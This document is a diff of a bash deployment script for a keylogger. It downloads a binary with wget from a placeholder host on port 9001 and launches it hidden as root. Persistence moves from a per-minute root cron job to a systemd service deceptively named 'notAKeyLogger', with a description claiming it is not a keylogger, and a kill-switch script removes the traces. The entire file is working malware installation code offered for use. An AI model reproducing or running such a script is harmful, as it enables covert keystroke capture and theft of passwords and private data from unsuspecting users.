@@ -1,34 +1,44 @@
 #!/bin/bash
 
-# launch.sh
-cat << 'EOF' > /tmp/launch.sh
-#!/bin/bash
-if ! pgrep -f "/tmp/keyl" > /dev/null; then
-    nohup /tmp/keyl &> /dev/null &
-fi
-EOF
-chmod +x /tmp/launch.sh
-
 # killSwitch.sh
-cat << 'EOF' > /tmp/killSwitch.sh
+cat << 'EOF' > /root/killSwitch.sh
 #!/bin/bash
 
-#crontab cleaner
-crontab -l -u root > /tmp/root_crontab.bak 2>/dev/null
-grep -v 'launch.sh' /tmp/root_crontab.bak > /tmp/root_crontab.new
-crontab -u root /tmp/root_crontab.new
-rm /tmp/root_crontab.bak /tmp/root_crontab.new
+#service cleaner
+sudo systemctl stop notAKeyLogger.service
+sudo systemctl disable notAKeyLogger.service
+rm /etc/systemd/system/notAKeyLogger.service
+sudo systemctl daemon-reload
 
 #files deleting
-rm -f /tmp/keyl /tmp/launch.sh /tmp/killSwitch.sh
+rm -f /root/keyl /root/killSwitch.sh
 EOF
-chmod +x /tmp/killSwitch.sh
+chmod +x /root/killSwitch.sh
 
-# add launch to the cronjob
-echo '*/1 * * * * /tmp/launch.sh' | crontab -u root -
+# creating a service
+cat << 'EOF' > /etc/systemd/system/notAKeyLogger.service
+[Service]
+ExecStart=/root/keyl
 
-#keyl
-wget -O /tmp/keyl http://<IP>:9001/dist/mykeyl
-chmod u+x /tmp/keyl
+[Install]
+WantedBy=multi-user.target
 
-nohup /tmp/keyl &> /dev/null &
+[Unit]
+Description= this is not a keylogger trust me
+After=network-online.target
+Wants=network-online.target
+EOF
+
+sudo systemctl daemon-reexec
+sudo systemctl daemon-reload
+sudo systemctl enable notAKeyLogger.service
+
+#keyl:
+wget -O /root/keyl http://<IP>:9001/dist/mykeyl
+chmod u+x /root/keyl
+
+#start:
+sudo systemctl start notAKeyLogger.service
+if ! pgrep -f "/root/keyl" > /dev/null; then
+    nohup /root/keyl &> /dev/null &
+fi
